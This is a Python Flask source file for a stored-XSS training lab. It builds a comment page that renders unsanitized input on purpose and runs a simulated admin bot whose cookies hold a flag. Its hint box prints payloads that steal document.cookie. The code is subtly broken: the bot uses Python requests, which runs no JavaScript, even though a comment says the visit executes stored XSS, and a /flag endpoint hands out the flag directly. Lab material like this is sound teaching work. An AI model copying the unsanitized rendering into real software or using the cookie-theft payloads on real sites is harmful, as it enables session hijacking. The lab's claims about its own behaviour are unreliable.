"""
XSS Stored Lab - Vulnerable Comment System with Admin Bot
Flag: FLAG{st0r3d_xss_p3rs1st3nt}

This lab includes a real admin bot that visits the page periodically,
making it a realistic XSS scenario where you can steal the admin's cookies.
"""
from flask import Flask, request, render_template_string, redirect, url_for, jsonify
import os
import threading
import time
import requests
from datetime import datetime

app = Flask(__name__)

# The secret flag (stored in admin's cookie)
FLAG = os.environ.get('LAB_FLAG', 'FLAG{st0r3d_xss_p3rs1st3nt}')

# In-memory storage for comments
comments = [
    {'author': 'Admin', 'content': 'Welcome to our blog! Feel free to leave comments.', 'timestamp': '2 hours ago'},
    {'author': 'User123', 'content': 'Great article, thanks for sharing!', 'timestamp': '1 hour ago'},
]

# Storage for captured data (to verify XSS success)
captured_data = []

# Bot configuration
BOT_INTERVAL = int(os.environ.get('BOT_INTERVAL', 30))  # Visit every 30 seconds
bot_running = False
bot_visit_count = 0
last_bot_visit = None

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Tech Blog - XSS Stored Lab</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Arial, sans-serif; 
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            color: #fff;
        }
        .container { max-width: 900px; margin: 0 auto; padding: 40px 20px; }
        h1 { text-align: center; margin-bottom: 10px; color: #0d6efd; }
        .subtitle { text-align: center; color: #aaa; margin-bottom: 30px; }
        
        .bot-status {
            background: linear-gradient(135deg, #198754, #157347);
            color: white;
            padding: 15px 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 10px;
        }
        .bot-status .pulse {
            width: 12px;
            height: 12px;
            background: #00ff00;
            border-radius: 50%;
            animation: pulse 2s infinite;
            margin-right: 10px;
        }
        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(0, 255, 0, 0.7); }
            70% { box-shadow: 0 0 0 10px rgba(0, 255, 0, 0); }
            100% { box-shadow: 0 0 0 0 rgba(0, 255, 0, 0); }
        }
        .bot-btn {
            background: rgba(255,255,255,0.2);
            border: 1px solid rgba(255,255,255,0.3);
            color: white;
            padding: 8px 16px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
        }
        .bot-btn:hover { background: rgba(255,255,255,0.3); }
        
        .blog-post {
            background: #fff;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
            margin-bottom: 20px;
            color: #333;
        }
        .blog-post h2 { color: #0d6efd; margin-bottom: 15px; }
        .blog-post p { line-height: 1.8; margin-bottom: 15px; }
        
        .comments-section {
            background: #fff;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
            color: #333;
        }
        .comments-section h3 { margin-bottom: 20px; color: #333; }
        
        .comment {
            padding: 15px;
            background: #f8f9fa;
            border-radius: 8px;
            margin-bottom: 15px;
            border-left: 4px solid #0d6efd;
        }
        .comment .meta { 
            display: flex; 
            justify-content: space-between; 
            margin-bottom: 8px;
        }
        .comment .author { font-weight: bold; color: #0d6efd; }
        .comment .time { color: #999; font-size: 12px; }
        .comment .content { color: #333; line-height: 1.6; }
        
        .comment-form { margin-top: 25px; padding-top: 25px; border-top: 2px solid #eee; }
        .comment-form h4 { margin-bottom: 15px; color: #333; }
        input[type="text"], textarea {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 14px;
            margin-bottom: 12px;
            font-family: inherit;
        }
        input:focus, textarea:focus { border-color: #0d6efd; outline: none; }
        button[type="submit"] {
            background: #0d6efd;
            color: #fff;
            border: none;
            padding: 12px 30px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
        }
        button[type="submit"]:hover { background: #0b5ed7; }
        
        .hint-box {
            background: rgba(13, 110, 253, 0.1);
            border: 1px solid rgba(13, 110, 253, 0.3);
            padding: 20px;
            border-radius: 10px;
            margin-top: 20px;
        }
        .hint-box h4 { color: #0d6efd; margin-bottom: 10px; }
        .hint-box ul { margin-left: 20px; margin-top: 10px; }
        .hint-box li { margin-bottom: 5px; }
        .hint-box code { 
            background: rgba(0,0,0,0.1); 
            padding: 2px 6px; 
            border-radius: 4px;
            font-size: 13px;
        }
        
        .webhook-info {
            background: rgba(255, 193, 7, 0.1);
            border: 1px solid rgba(255, 193, 7, 0.3);
            padding: 15px;
            border-radius: 8px;
            margin-top: 15px;
            font-size: 14px;
        }
        .webhook-info code {
            background: rgba(0,0,0,0.1);
            padding: 3px 8px;
            border-radius: 4px;
            display: block;
            margin-top: 8px;
            word-break: break-all;
        }
        
        .reset-btn {
            background: #dc3545;
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 12px;
            text-decoration: none;
            margin-left: 10px;
        }
        .reset-btn:hover { background: #bb2d3b; }
        
        .capture-box {
            background: rgba(25, 135, 84, 0.1);
            border: 1px solid rgba(25, 135, 84, 0.3);
            padding: 20px;
            border-radius: 10px;
            margin-top: 20px;
        }
        .capture-box h4 { color: #198754; margin-bottom: 10px; }
        .capture-item {
            background: rgba(0,0,0,0.1);
            padding: 10px;
            border-radius: 5px;
            margin-top: 10px;
            word-break: break-all;
        }
        .capture-item small { color: #666; }
        .capture-item code { display: block; margin-top: 5px; color: #198754; }
    </style>
</head>
<body>
    <div class="container">
        <h1>📝 Tech Blog</h1>
        <p class="subtitle">Latest in Technology & Security</p>
        
        <!-- Bot Status -->
        <div class="bot-status">
            <div style="display: flex; align-items: center;">
                <div class="pulse"></div>
                <div>
                    <strong>🤖 Admin Bot Active</strong><br>
                    <small>Visits: {{ bot_visits }} | Last visit: {{ last_visit }} | Interval: {{ bot_interval }}s</small>
                </div>
            </div>
            <button class="bot-btn" onclick="triggerBot()">🚀 Trigger Bot Visit</button>
        </div>
        
        <div class="blog-post">
            <h2>Understanding Web Security</h2>
            <p>Web security is crucial in today's connected world. Applications must protect against various attacks including XSS, SQL Injection, and CSRF.</p>
            <p>Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by other users. Stored XSS is particularly dangerous because the payload persists in the database.</p>
            <p>Always sanitize user input and encode output to prevent these attacks!</p>
        </div>
        
        <div class="comments-section">
            <h3>💬 Comments ({{ comments|length }}) <a href="/reset" class="reset-btn">Reset</a></h3>
            
            {% for comment in comments %}
            <div class="comment">
                <div class="meta">
                    <span class="author">{{ comment.author }}</span>
                    <span class="time">{{ comment.timestamp }}</span>
                </div>
                <div class="content">{{ comment.content | safe }}</div>
            </div>
            {% endfor %}
            
            <div class="comment-form">
                <h4>Leave a Comment</h4>
                <form method="POST" action="/comment">
                    <input type="text" name="author" placeholder="Your name" required maxlength="50">
                    <textarea name="content" rows="4" placeholder="Your comment..." required></textarea>
                    <button type="submit">Post Comment</button>
                </form>
            </div>
        </div>
        
        <div class="hint-box">
            <h4>🎯 Lab Objective</h4>
            <p>Inject a stored XSS payload to steal the admin bot's cookies. The bot visits this page every <strong>{{ bot_interval }} seconds</strong> with a session cookie containing the flag.</p>
            
            <ul>
                <li>Comments are <strong>not sanitized</strong> before storage</li>
                <li>The admin bot has cookies: <code>admin_session=FLAG{...}</code></li>
                <li>Your payload must exfiltrate the cookie to capture the flag</li>
            </ul>
            
            <div class="webhook-info">
                <strong>📡 Exfiltration Endpoint:</strong>
                <code>GET /capture?data=STOLEN_DATA</code>
                <br><br>
                <strong>Example Payload:</strong>
                <code>&lt;script&gt;new Image().src='/capture?data='+document.cookie&lt;/script&gt;</code>
                <br><br>
                <strong>Alternative:</strong>
                <code>&lt;img src=x onerror="fetch('/capture?data='+document.cookie)"&gt;</code>
            </div>
        </div>
        
        {% if captures %}
        <div class="capture-box">
            <h4>🏆 Captured Data (Last 5)</h4>
            <p>Your XSS payload successfully captured:</p>
            {% for capture in captures %}
            <div class="capture-item">
                <small>{{ capture.timestamp }}</small>
                <code>{{ capture.data }}</code>
            </div>
            {% endfor %}
        </div>
        {% endif %}
    </div>
    
    <script>
        function triggerBot() {
            fetch('/trigger-bot', { method: 'POST' })
                .then(r => r.json())
                .then(data => {
                    alert(data.message);
                    setTimeout(() => location.reload(), 1500);
                });
        }
        
        // Auto-refresh to show new captures
        setTimeout(() => location.reload(), 60000);
    </script>
</body>
</html>
'''


def admin_bot_visit():
    """Simulate admin bot visiting the page with cookies containing the flag"""
    global bot_visit_count, last_bot_visit
    
    try:
        # Create session with admin cookies
        session = requests.Session()
        session.cookies.set('admin_session', FLAG)
        session.cookies.set('user_role', 'admin')
        session.cookies.set('user_id', '1')
        
        # Visit the main page (this will execute any stored XSS)
        response = session.get('http://127.0.0.1:80/', timeout=10)
        
        bot_visit_count += 1
        last_bot_visit = datetime.now().strftime('%H:%M:%S')
        
        print(f"[Bot] Admin visited page (visit #{bot_visit_count})")
        
    except Exception as e:
        print(f"[Bot] Error during visit: {e}")


def bot_loop():
    """Background bot that periodically visits the page"""
    global bot_running
    
    print(f"[Bot] Starting admin bot (interval: {BOT_INTERVAL}s)")
    time.sleep(5)  # Initial delay to let server start
    
    while bot_running:
        admin_bot_visit()
        time.sleep(BOT_INTERVAL)


def start_bot():
    """Start the admin bot"""
    global bot_running
    
    if not bot_running:
        bot_running = True
        bot_thread = threading.Thread(target=bot_loop, daemon=True)
        bot_thread.start()
        print("[Bot] Admin bot started")


@app.route('/')
def index():
    return render_template_string(
        HTML_TEMPLATE, 
        comments=comments, 
        captures=captured_data[-5:],  # Show last 5 captures
        bot_visits=bot_visit_count,
        last_visit=last_bot_visit or 'Waiting...',
        bot_interval=BOT_INTERVAL
    )


@app.route('/comment', methods=['POST'])
def add_comment():
    author = request.form.get('author', 'Anonymous')[:50]
    content = request.form.get('content', '')
    
    # VULNERABLE: No sanitization of comment content
    # XSS payload will be stored and executed for all visitors including the bot
    if author and content:
        comments.append({
            'author': author, 
            'content': content,
            'timestamp': datetime.now().strftime('%H:%M')
        })
        print(f"[Comment] New comment from {author}")
    
    return redirect(url_for('index'))


@app.route('/capture')
def capture():
    """Endpoint to capture exfiltrated data from XSS payloads"""
    data = request.args.get('data') or request.args.get('c') or request.args.get('cookie') or ''
    
    if data:
        capture_entry = {
            'data': data,
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'ip': request.remote_addr
        }
        captured_data.append(capture_entry)
        print(f"[CAPTURE] Data received: {data[:100]}...")
        
        # Check if flag was captured
        if FLAG in data:
            print(f"[SUCCESS] 🎉 Flag captured!")
    
    # Return empty response (for image-based exfiltration)
    return '', 204


@app.route('/trigger-bot', methods=['POST'])
def trigger_bot():
    """Manually trigger a bot visit"""
    admin_bot_visit()
    return jsonify({
        'success': True,
        'message': f'🤖 Admin bot visited! (Visit #{bot_visit_count})'
    })


@app.route('/reset')
def reset():
    """Reset comments and captures to default"""
    global comments, captured_data
    comments = [
        {'author': 'Admin', 'content': 'Welcome to our blog! Feel free to leave comments.', 'timestamp': '2 hours ago'},
        {'author': 'User123', 'content': 'Great article, thanks for sharing!', 'timestamp': '1 hour ago'},
    ]
    captured_data = []
    return redirect(url_for('index'))


@app.route('/flag')
def get_flag():
    """API endpoint for verification"""
    return jsonify({'flag': FLAG})


@app.route('/bot-status')
def bot_status():
    """Get bot status"""
    return jsonify({
        'running': bot_running,
        'visits': bot_visit_count,
        'last_visit': last_bot_visit,
        'interval': BOT_INTERVAL
    })


if __name__ == '__main__':
    # Start the admin bot
    start_bot()
    
    # Run the Flask app
    app.run(host='0.0.0.0', port=80, debug=False, threaded=True)
